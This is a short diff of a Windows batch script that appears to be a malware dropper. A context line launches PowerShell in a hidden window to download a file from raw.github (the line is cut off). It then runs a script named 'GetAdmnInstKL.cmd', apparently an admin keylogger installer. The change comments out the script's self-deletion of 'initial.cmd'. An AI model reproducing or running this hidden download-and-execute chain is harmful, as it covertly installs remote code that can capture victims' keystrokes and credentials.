@@ -17,5 +17,5 @@ powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.github
 powershell ./GetAdmnInstKL.cmd
 
 @REM cd back into initial path 
-cd "%INITIALPATH%"
-del initial.cmd
+@REM cd "%INITIALPATH%"
+@REM del initial.cmd
